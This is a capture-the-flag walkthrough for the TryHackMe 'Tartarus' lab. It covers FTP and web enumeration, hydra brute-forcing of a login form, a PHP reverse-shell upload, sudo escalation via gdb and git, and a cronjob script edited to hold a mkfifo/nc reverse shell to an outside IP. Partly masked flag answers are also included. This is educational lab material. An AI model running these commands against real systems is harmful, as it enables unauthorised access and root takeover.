# TryHackMe Tartarus

**This is an beginner box based on simple enumeration of services and basic privilege escalation techniques. Based jake**

## Task-1 Tartarus

* *Enumeration* - Doing nmap scan gave us 21,22,80 port open. 

* *Port -21* : FTP allowed us anonymous login. So typing command '*ftp IP*' and then 'anonymous' as name and password gave us a successful login. After that we can see a file named 'test.txt' and a directory '...' in the FTP shell. Get the .txt file on your shell using command '*get test.txt*'. Now go to '...' directory. It again gave a same named directory. Again going into that gave us another file named 'yougotgoodeyes.txt'. Get this file on your shell.

* Now see the content of test file. It just gave us 'vsftpd test file'. Now see for yougotgoodeyes.txt and it gives us a directory. Now we shall go on browser.

* *Port -80* : Open the link in browser. It gaves a default Apache2 page. On trying 'robots.txt' on the site gave us another directory along with a username : 'd4rckh'.

* Going on the above directory gave us two files 'credentials.txt' and 'userid'. Get these files on your machine using wget. 

* Also from FTP we got a directory. Opening that gave us a login page. So we have a list of usernames, password and a login page. Simple idea is to use hydra for password cracking. 

* Type the command ' *hydra -L userid -P credentials.txt IP http-post-form "/directoryWhichWeGotFromFTP/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!* '.  This will give username. 

* Now to crack password we will use command ' *hydra -l userFromAboveResult -P credentials.txt IP http-post-form "/directoryWhichWeGotFromFTP/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!* '. This will give us our password.

* Now login into the site using these creds. After that it gives us a uploading file option. We can upload our php reverse shell there. After uploading that start you nc listener. After that go to /<directoryWhihcWeGotFromFTP>/images/uploads/phpRevShell.php and you will get your shell.

* After logging into the shell we can see that we are 'www-data'. Go to '/home'	to see the list of users. Now type 'sudo -l' and we see that a user 'thirtytwo' can run gdb command. Now go to https://gtfobins.github.io/ to search for gdb sudo and we find one. Now type this command ' *sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex q* '. Now we are 'thirtytwo'.

* Again type 'sudo -l' and we see that 'd4rckh' can run git. Again go to https://gtfobins.github.io/ to search for git sudo. Now type ' *sudo -u d4rckh /usr/bin/git -p help config* ' and then type '!bash' to gain a bash shell. Now go to '/home/d4rckh'. In there we see a 'cleanup.py' file and 'user.txt' file  which is your user flag.

* We can edit this file to gain root shell. Also if you see '/etc/crontab' we can see that cleanup.py is running as a cronjob. Now edit .py file and type ' *os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.19.203 4444 >/tmp/f')* ' in the 'try' block and simultaneously start nc listener in other window. Wait for some time and your root shell will be spawned.

*  Now type ' *cat /root/root.txt* ' to gain root flag.

## 1. User Flag
Answer : 0f7dbb2243e692e3ad222b**********

## 2. Root Flag
Answer : 7e055812184a5fa5109d5d**********
